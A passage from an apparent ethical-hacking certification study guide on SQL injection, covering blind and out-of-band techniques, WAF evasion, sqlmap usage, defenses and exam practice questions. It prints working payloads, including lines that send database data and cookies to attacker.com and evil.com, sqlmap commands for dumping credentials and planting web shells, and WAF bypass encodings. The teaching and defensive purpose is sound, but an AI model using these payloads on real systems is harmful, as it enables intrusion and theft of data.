  WHERE table_schema=database() AND table_name='users') > 0--
```

#### Time-Based Blind SQL Injection

The attacker uses time delays to infer TRUE/FALSE. If the condition is TRUE, the server delays its response; if FALSE, it responds immediately.

```sql
-- Test if injectable (MySQL)
' AND IF(1=1, SLEEP(5), 0)--    (response delayed 5 seconds = TRUE)
' AND IF(1=2, SLEEP(5), 0)--    (response immediate = FALSE)

-- Extract database name character by character
' AND IF(SUBSTRING(database(),1,1)='m', SLEEP(5), 0)--
-- If response takes 5 seconds: first character is 'm'

-- MSSQL time-based
'; IF (1=1) WAITFOR DELAY '0:0:5'--
'; IF (SUBSTRING(DB_NAME(),1,1)='m') WAITFOR DELAY '0:0:5'--

-- PostgreSQL time-based
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--

-- Oracle time-based
' AND 1=CASE WHEN (1=1) THEN DBMS_PIPE.RECEIVE_MESSAGE('a',5) ELSE 0 END--
```

### Out-of-Band SQL Injection

Out-of-band SQLi uses a **different channel** to extract data — typically DNS or HTTP requests from the database server to an attacker-controlled server.

```sql
-- MSSQL: DNS exfiltration using xp_dirtree
'; DECLARE @data VARCHAR(1024);
SET @data = (SELECT TOP 1 username FROM users);
EXEC master..xp_dirtree '\\' + @data + '.attacker.com\share'--
-- The database server makes a DNS lookup for "admin.attacker.com"
-- The attacker reads the data from DNS logs

-- Oracle: HTTP exfiltration using UTL_HTTP
' UNION SELECT UTL_HTTP.REQUEST(
  'http://attacker.com/?data=' || (SELECT username FROM users WHERE ROWNUM=1)
) FROM dual--
```

**When to use out-of-band:** When in-band is not possible (no output in response) and blind is too slow (time-based takes too long).

## 3.3 SQL Injection Types — Summary Table

| Type | Sub-Type | Data Channel | Speed | Visibility |
|------|----------|-------------|-------|------------|
| **In-Band** | Error-Based | Same (HTTP response) | Fast | Errors displayed |
| **In-Band** | Union-Based | Same (HTTP response) | Fast | Data in response |
| **Blind** | Boolean-Based | Same (inferred from page behavior) | Slow | No direct output |
| **Blind** | Time-Based | Same (inferred from response time) | Very Slow | No direct output |
| **Out-of-Band** | DNS/HTTP | Different (DNS, HTTP) | Medium | Data via external channel |

## 3.4 SQL Injection Methodology

```
Phase 1: Discovery
    1. Identify input points (URL params, form fields, headers, cookies)
    2. Test for SQL injection with basic payloads:
       '
       "
       ' OR '1'='1
       ' OR '1'='1'--
       ' OR '1'='1'#
       ' OR '1'='1'/*
       1' AND '1'='1
       1' AND '1'='2

Phase 2: Characterization
    3. Determine the database type:
       - @@version (MSSQL/MySQL)
       - version() (MySQL/PostgreSQL)
       - banner FROM v$version (Oracle)
       - sqlite_version() (SQLite)
    4. Determine the injection type (error-based, union, blind, etc.)
    5. Determine the number of columns (ORDER BY or UNION SELECT NULL)

Phase 3: Extraction
    6. Extract database names
    7. Extract table names (information_schema.tables)
    8. Extract column names (information_schema.columns)
    9. Extract data from target tables

Phase 4: Escalation (if applicable)
    10. Read files from the file system (LOAD_FILE)
    11. Write files (INTO OUTFILE) -- web shell upload
    12. Execute OS commands (xp_cmdshell on MSSQL)
    13. Escalate privileges within the database
```

## 3.5 SQL Injection Evasion Techniques

When WAFs or IDS block standard SQL injection payloads, attackers use evasion techniques:

### Character Encoding

```sql
-- URL encoding
' UNION SELECT -> %27%20UNION%20SELECT

-- Double URL encoding
' -> %2527

-- Hex encoding (MySQL)
SELECT -> 0x53454c454354

-- Unicode encoding
' -> %u0027
```

### String Concatenation

```sql
-- MySQL
CONCAT('SEL','ECT')

-- MSSQL
'SEL' + 'ECT'

-- Oracle
'SEL' || 'ECT'

-- PostgreSQL
'SEL' || 'ECT'
```

### Whitespace Manipulation

```sql
-- Replace spaces with alternatives
'UNION/**/SELECT             -- inline comment replaces space
'UNION%09SELECT              -- tab character
'UNION%0ASELECT              -- newline
'UNION%0DSELECT              -- carriage return
'UNION%0D%0ASELECT           -- CRLF
'UNION%A0SELECT              -- non-breaking space
```

### Hex Encoding

```sql
-- MySQL: use hex values instead of strings
SELECT * FROM users WHERE name='admin'
SELECT * FROM users WHERE name=0x61646d696e

-- Hex for common strings
'admin'  -> 0x61646d696e
'users'  -> 0x7573657273
```

### URL Encoding

```sql
-- Single encoding
' OR 1=1-- -> %27%20OR%201%3D1--

-- Double encoding (bypass WAFs that decode once)
' OR 1=1-- -> %2527%2520OR%25201%253D1--
```

### Case Variation

```sql
-- Mix upper and lowercase
UNION SELECT -> uNiOn SeLeCt
SELECT -> SeLeCt
```

### Comment-Based Evasion

```sql
-- Inline comments to break up keywords (MySQL)
UN/**/ION SEL/**/ECT

-- Comment out rest of query
' OR 1=1--              -- MSSQL, MySQL, PostgreSQL
' OR 1=1#               -- MySQL only
```

### Additional Evasion Techniques

```sql
-- No quotes needed (numeric injection)
1 OR 1=1

-- Using LIKE instead of =
' OR username LIKE 'adm%'--

-- Using BETWEEN
' OR 1 BETWEEN 1 AND 1--

-- Using IN
' OR 1 IN (1)--

-- NULL byte injection
%00' UNION SELECT 1,2,3--

-- HTTP parameter pollution
?id=1&id=' UNION SELECT 1,2,3--
```

### Evasion Summary Table

| Technique | Standard Payload | Evaded Payload |
|-----------|----------|--------|
| Keyword blocking | UNION SELECT | uNiOn SeLeCt or UN/\*\*/ION SEL/\*\*/ECT |
| Quote filtering | 'admin' | 0x61646d696e (hex) or CHAR(97,100,109,105,110) |
| Space filtering | UNION SELECT | UNION%09SELECT or UNION/\*\*/SELECT |
| WAF single decode | %27 (decoded to single-quote) | %2527 (decoded to %27, then to single-quote) |
| Comment filtering | -- | # or /\*\*/ |

## 3.6 sqlmap — Automated SQL Injection Tool

**sqlmap** is the most widely used open-source tool for automating SQL injection detection and exploitation. It supports MySQL, Oracle, PostgreSQL, MSSQL, SQLite, and many others.

### Basic sqlmap Commands

```bash
# Test a URL parameter for SQL injection
sqlmap -u "http://target.com/page.php?id=1"

# Test with POST data
sqlmap -u "http://target.com/login.php" --data="username=admin&password=test"

# Test with a cookie
sqlmap -u "http://target.com/page.php?id=1" --cookie="session=abc123"

# Test with custom headers
sqlmap -u "http://target.com/api/users" --headers="Authorization: Bearer token123"

# Use a request file from Burp Suite
sqlmap -r request.txt
```

### Enumeration Commands

```bash
# Get current database name
sqlmap -u "http://target.com/page.php?id=1" --current-db

# Get current user
sqlmap -u "http://target.com/page.php?id=1" --current-user

# List all databases
sqlmap -u "http://target.com/page.php?id=1" --dbs

# List tables in a specific database
sqlmap -u "http://target.com/page.php?id=1" -D dbname --tables

# List columns in a specific table
sqlmap -u "http://target.com/page.php?id=1" -D dbname -T users --columns

# Dump data from a specific table
sqlmap -u "http://target.com/page.php?id=1" -D dbname -T users --dump

# Dump specific columns
sqlmap -u "http://target.com/page.php?id=1" -D dbname -T users -C username,password --dump

# Dump all databases
sqlmap -u "http://target.com/page.php?id=1" --dump-all
```

### Advanced sqlmap Commands

```bash
# Specify injection technique
# B = Boolean-based blind
# E = Error-based
# U = Union-based
# S = Stacked queries
# T = Time-based blind
# Q = Inline queries
sqlmap -u "http://target.com/page.php?id=1" --technique=BEU

# Specify database type
sqlmap -u "http://target.com/page.php?id=1" --dbms=mysql

# Use a specific tamper script for WAF evasion
sqlmap -u "http://target.com/page.php?id=1" --tamper=space2comment

# Multiple tamper scripts
sqlmap -u "http://target.com/page.php?id=1" --tamper=space2comment,randomcase,between

# OS shell (execute OS commands via SQL injection)
sqlmap -u "http://target.com/page.php?id=1" --os-shell

# SQL shell (interactive SQL prompt)
sqlmap -u "http://target.com/page.php?id=1" --sql-shell

# Read a file from the server
sqlmap -u "http://target.com/page.php?id=1" --file-read="/etc/passwd"

# Write a file to the server (web shell)
sqlmap -u "http://target.com/page.php?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php"

# Increase verbosity
sqlmap -u "http://target.com/page.php?id=1" -v 3

# Set risk and level
# Level: 1-5 (default 1; higher = more payloads, tests cookies/headers at level 2+)
# Risk: 1-3 (default 1; risk 3 includes heavy time-based tests and OR-based)
sqlmap -u "http://target.com/page.php?id=1" --level=5 --risk=3

# Batch mode (answer all questions automatically)
sqlmap -u "http://target.com/page.php?id=1" --batch

# Use a proxy
sqlmap -u "http://target.com/page.php?id=1" --proxy="http://127.0.0.1:8080"

# Use random user agent
sqlmap -u "http://target.com/page.php?id=1" --random-agent

# Crawl the website and test all forms
sqlmap -u "http://target.com/" --crawl=3 --forms --batch
```

### Common sqlmap Tamper Scripts

| Tamper Script | Description |
|---------------|-------------|
| space2comment | Replaces spaces with inline comments |
| randomcase | Randomizes the case of SQL keywords |
| between | Replaces > with NOT BETWEEN 0 AND and = with BETWEEN X AND X |
| charencode | URL-encodes all characters |
| chardoubleencode | Double URL-encodes all characters |
| space2plus | Replaces spaces with + |
| base64encode | Base64-encodes the payload |
| equaltolike | Replaces = with LIKE |
| unionalltounion | Replaces UNION ALL SELECT with UNION SELECT |
| percentage | Adds % between each character (IIS-specific) |

### sqlmap Workflow Example

```bash
# Step 1: Test if the parameter is injectable
sqlmap -u "http://target.com/products.php?id=5" --batch

# Step 2: Identify databases
sqlmap -u "http://target.com/products.php?id=5" --dbs --batch

# Step 3: Select database and list tables
sqlmap -u "http://target.com/products.php?id=5" -D shop_db --tables --batch

# Step 4: List columns of interesting table
sqlmap -u "http://target.com/products.php?id=5" -D shop_db -T users --columns --batch

# Step 5: Dump credentials
sqlmap -u "http://target.com/products.php?id=5" -D shop_db -T users -C username,password --dump --batch
```

## 3.7 SQL Injection Defenses

### Parameterized Queries (Prepared Statements)

Parameterized queries are the **primary defense** against SQL injection. They separate SQL code from data — user input is treated as a parameter (data), never as SQL code.

**Vulnerable code (string concatenation):**
```php
// PHP - VULNERABLE
$query = "SELECT * FROM users WHERE username = '$username' AND password = '$password'";
```

**Secure code (parameterized query):**
```php
// PHP PDO - SECURE
$stmt = $pdo->prepare("SELECT * FROM users WHERE username = :username AND password = :password");
$stmt->execute(['username' => $username, 'password' => $password]);
```

**Other languages:**

```java
// Java - Prepared Statement
PreparedStatement stmt = conn.prepareStatement(
    "SELECT * FROM users WHERE username = ? AND password = ?");
stmt.setString(1, username);
stmt.setString(2, password);
ResultSet rs = stmt.executeQuery();
```

```python
# Python - Parameterized query
cursor.execute(
    "SELECT * FROM users WHERE username = %s AND password = %s",
    (username, password))
```

```csharp
// C# .NET - Parameterized query
SqlCommand cmd = new SqlCommand(
    "SELECT * FROM users WHERE username = @user AND password = @pass", conn);
cmd.Parameters.AddWithValue("@user", username);
cmd.Parameters.AddWithValue("@pass", password);
```

### Input Validation

| Approach | Description | Effectiveness |
|----------|-------------|--------------|
| **Whitelist validation** (recommended) | Only allow known-good input (e.g., only alphanumeric characters, specific format) | Most effective; rejects unexpected input |
| **Blacklist validation** (not recommended as sole defense) | Block known-bad input (e.g., reject strings containing SELECT, UNION, --, etc.) | Easily bypassed with encoding, case variation, or new attack patterns |

**Whitelist examples:**
```python
# Only allow numeric input for an ID parameter
import re
if not re.match(r'^[0-9]+$', user_input):
    raise ValueError("Invalid input")

# Only allow alphanumeric characters for a username
if not re.match(r'^[a-zA-Z0-9_]+$', username):
    raise ValueError("Invalid username")

# Validate email format
if not re.match(r'^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$', email):
    raise ValueError("Invalid email")
```

### Additional SQL Injection Defenses

| Defense | Description |
|---------|-------------|
| **Stored procedures** | Use stored procedures with parameterized inputs; do not build dynamic SQL inside stored procedures |
| **Least privilege** | Database user used by the application should have minimum permissions (no DROP, no xp_cmdshell, no FILE privilege) |
| **WAF** | Web Application Firewall can block known SQL injection patterns (but can be bypassed) |
| **Error handling** | Never display database error messages to users; use generic error pages |
| **ORM (Object-Relational Mapping)** | Frameworks like Hibernate, Entity Framework, SQLAlchemy abstract SQL and typically use parameterized queries |
| **Escaping special characters** | Escape quotes and special characters (less reliable than parameterized queries; use only as a secondary defense) |
| **Database hardening** | Disable xp_cmdshell (MSSQL), disable LOAD_FILE and INTO OUTFILE (MySQL), remove unused database features |

### WAF Bypass for SQL Injection

WAFs can be bypassed using the evasion techniques from section 3.5. Additional WAF-specific bypasses:

```
-- HTTP parameter pollution (send same parameter multiple times)
?id=1&id=' UNION SELECT 1,2,3--

-- HTTP verb tampering (send as PUT instead of GET)
PUT /page.php?id=1' UNION SELECT 1,2,3-- HTTP/1.1

-- Content-Type manipulation
Change Content-Type from application/x-www-form-urlencoded to multipart/form-data

-- Chunked transfer encoding
Use Transfer-Encoding: chunked to split the payload across chunks

-- JSON-based SQL injection (WAFs often do not inspect JSON bodies)
{"username": "admin' OR '1'='1", "password": "test"}
```

---

## Day 5 Quick-Review Flashcard Table

| Topic | Key Fact |
|-------|---------|
| Apache web server | Open-source; config in httpd.conf; supports .htaccess |
| IIS web server | Windows-only; config in web.config/applicationHost.config |
| Nginx | High-performance; event-driven; reverse proxy and load balancer |
| Directory traversal | ../../../etc/passwd — access files outside web root |
| HTTP response splitting | Inject CRLF (%0d%0a) into HTTP headers to split responses |
| Web cache poisoning | Manipulate cache to serve malicious content to all users |
| Banner grabbing tools | netcat, wget, curl, Nmap (--script http-headers) |
| robots.txt | Reveals hidden directories; not a security mechanism |
| Nikto | Open-source web server scanner; checks for misconfigurations and vulnerabilities |
| OWASP Top 10 A01 | Broken Access Control (IDOR, privilege escalation) |
| OWASP Top 10 A03 | Injection (SQL, command, LDAP) |
| OWASP Top 10 A10 | Server-Side Request Forgery (SSRF) — new in 2021 |
| Stored XSS | Script stored on server; affects all visitors |
| Reflected XSS | Script in URL; victim must click a crafted link |
| DOM-based XSS | Client-side JavaScript writes user input to DOM without sanitization |
| XSS countermeasure | Output encoding, CSP header, HttpOnly cookie flag |
| CSRF | Trick victim's browser into making authenticated requests |
| CSRF countermeasure | Anti-CSRF tokens, SameSite cookie attribute |
| SSRF | Server makes requests to attacker-specified URLs (access internal services) |
| SSRF target | AWS metadata: http://169.254.169.254/latest/meta-data/ |
| Clickjacking | Transparent iframe over legitimate-looking page |
| Clickjacking countermeasure | X-Frame-Options: DENY or CSP: frame-ancestors 'self' |
| IDOR | Change object ID in request to access another user's data |
| XXE | XML External Entity injection; reads local files via XML parser |
| XSS vs. CSRF | XSS: user trusts the website; CSRF: website trusts the user's browser |
| Error-based SQLi | Database errors reveal information in HTTP response |
| Union-based SQLi | UNION SELECT appends additional query results |
| Boolean-based blind SQLi | Infer data from TRUE/FALSE page behavior changes |
| Time-based blind SQLi | Infer data from response time delays (SLEEP, WAITFOR DELAY) |
| Out-of-band SQLi | Extract data via DNS or HTTP from the database server |
| ORDER BY for column count | Increment ORDER BY until error; last successful number = column count |
| sqlmap -u URL --dbs | List all databases |
| sqlmap --dump | Extract data from a table |
| sqlmap --os-shell | Get OS command execution |
| sqlmap --tamper | Apply evasion scripts (space2comment, randomcase, etc.) |
| Primary SQLi defense | Parameterized queries (prepared statements) |
| Whitelist vs. blacklist | Whitelist = allow known-good (better); Blacklist = block known-bad (weaker) |
| information_schema.tables | System table containing all table names (MySQL, MSSQL, PostgreSQL) |
| Gobuster | Go-based tool for directory/file brute-forcing |
| Burp Suite Sequencer | Analyzes randomness of session tokens |

---

## Day 5 Exam-Style Practice Questions

**Question 1:** An attacker submits the following URL to a web application:

```
http://target.com/view.php?file=../../../../etc/passwd
```

What type of attack is this?

A. SQL Injection
B. Cross-Site Scripting (XSS)
C. Directory Traversal (Path Traversal)
D. Server-Side Request Forgery (SSRF)

**Answer: C.** Directory traversal (path traversal) uses ../ sequences to navigate up the directory tree and access files outside the web root. The attacker is attempting to read the /etc/passwd file from the server.

---

**Question 2:** An attacker injects the following into a search field on a web application:

```
' UNION SELECT 1, username, password FROM users--
```

The web page displays usernames and password hashes from the database. What type of SQL injection is this?

A. Error-based SQL injection
B. Union-based SQL injection
C. Boolean-based blind SQL injection
D. Time-based blind SQL injection

**Answer: B.** Union-based SQL injection uses the UNION SELECT statement to combine the results of the original query with the attacker's query. The data (usernames, passwords) is displayed directly in the web page.

---

**Question 3:** A penetration tester is testing a login form for SQL injection. The tester notices that when submitting `' OR 1=1--` as the username, the page displays "Welcome, admin!" However, when submitting `' OR 1=2--`, the page displays "Invalid credentials." No error messages are shown. What type of SQL injection is this?

A. Error-based SQL injection
B. Union-based SQL injection
C. Boolean-based blind SQL injection
D. Out-of-band SQL injection

**Answer: C.** Boolean-based blind SQL injection relies on observing differences in the application's behavior based on TRUE/FALSE conditions. When the condition is TRUE (1=1), the login succeeds; when FALSE (1=2), it fails. No data or error messages are directly displayed.

---

**Question 4:** Which of the following is the MOST effective defense against SQL injection?

A. Web Application Firewall (WAF)
B. Input validation using a blacklist
C. Parameterized queries (prepared statements)
D. Escaping special characters

**Answer: C.** Parameterized queries (prepared statements) separate SQL code from data, making it impossible for user input to be interpreted as SQL code. WAFs (A) can be bypassed. Blacklist validation (B) is easily circumvented with encoding or new techniques. Escaping (D) is less reliable and error-prone compared to parameterized queries.

---

**Question 5:** An attacker wants to identify the number of columns in a SQL query. Which payload should the attacker use?

A. ' UNION SELECT NULL--
B. ' ORDER BY 1-- followed by ' ORDER BY 2--, increasing until an error occurs
C. ' AND 1=1--
D. ' AND SLEEP(5)--

**Answer: B.** The ORDER BY technique increments the column number until the query produces an error. The last successful number indicates the total number of columns. UNION SELECT NULL (A) can also work but requires guessing; ORDER BY is more systematic. Boolean-based (C) tests for injection but not column count. Time-based (D) tests for injection, not column count.

---

**Question 6:** A web application allows users to enter a URL that the server fetches and displays a preview. An attacker enters `http://169.254.169.254/latest/meta-data/`. What attack is this?

A. Cross-Site Request Forgery (CSRF)
B. Server-Side Request Forgery (SSRF)
C. XML External Entity (XXE) injection
D. Open redirect

**Answer: B.** Server-Side Request Forgery (SSRF) exploits server-side URL fetching functionality to access internal resources. The URL 169.254.169.254 is the AWS EC2 metadata service, which contains instance credentials and configuration. The attacker uses the server as a proxy to reach this internal-only service.

---

**Question 7:** Which sqlmap command would extract all database names from a vulnerable web application?

A. sqlmap -u "http://target.com/page.php?id=1" --tables
B. sqlmap -u "http://target.com/page.php?id=1" --dbs
C. sqlmap -u "http://target.com/page.php?id=1" --dump
D. sqlmap -u "http://target.com/page.php?id=1" --columns

**Answer: B.** The --dbs flag tells sqlmap to enumerate all available databases. --tables (A) lists tables (requires -D for database). --dump (C) extracts data (requires -D and -T). --columns (D) lists columns (requires -D and -T).

---

**Question 8:** A developer is building a search feature. Which of the following input validation approaches is MORE secure?

A. Blacklist: reject input containing SELECT, UNION, DROP, --, and single-quote
B. Whitelist: only allow alphanumeric characters, spaces, and hyphens

**Answer: B.** Whitelist validation (allowing only known-good input) is more secure than blacklist validation (blocking known-bad input). Blacklists can be bypassed with encoding (URL encoding, hex, Unicode), case variations (SeLeCt), or new attack patterns not in the blacklist. A whitelist approach rejects anything that does not match the expected pattern.

---

**Question 9:** An attacker discovers that a website is vulnerable to XSS. The attacker posts a comment on a blog with the following content:

```html
<script>document.location='http://evil.com/steal?c='+document.cookie</script>
```

Every user who views the blog page is redirected and their cookies are sent to the attacker. What type of XSS is this?

A. Reflected XSS
B. Stored (Persistent) XSS
C. DOM-based XSS
D. Self-XSS

**Answer: B.** Stored (Persistent) XSS occurs when the malicious script is permanently stored on the target server (in this case, as a blog comment). Every user who views the page is affected. Reflected XSS (A) requires the victim to click a specially crafted link. DOM-based XSS (C) is a client-side vulnerability. Self-XSS (D) requires social engineering to trick the user into pasting code into their own browser console.

---

**Question 10:** Which HTTP header prevents a web page from being loaded inside an iframe, defending against clickjacking?

A. Content-Security-Policy: default-src 'self'
B. X-Frame-Options: DENY
C. X-Content-Type-Options: nosniff
D. Strict-Transport-Security: max-age=31536000

**Answer: B.** X-Frame-Options: DENY prevents the page from being loaded in any iframe, which is the primary defense against clickjacking. Content-Security-Policy: frame-ancestors 'none' (not shown but also valid) is the modern equivalent. CSP with default-src 'self' (A) controls content sources but does not specifically prevent framing unless frame-ancestors is set. X-Content-Type-Options (C) prevents MIME-type sniffing. HSTS (D) enforces HTTPS but does not prevent framing.

---

**Question 11:** A penetration tester finds that a WAF is blocking SQL injection attempts. Which sqlmap option should the tester use to bypass the WAF?

A. --level=5
B. --risk=3
C. --tamper=space2comment,randomcase
D. --batch

**Answer: C.** The --tamper option applies transformation scripts to the SQL injection payloads to evade WAFs. space2comment replaces spaces with inline comments, and randomcase randomizes the case of SQL keywords. --level (A) increases the number of tests but does not apply evasion. --risk (B) increases the aggressiveness of payloads. --batch (D) runs in non-interactive mode.
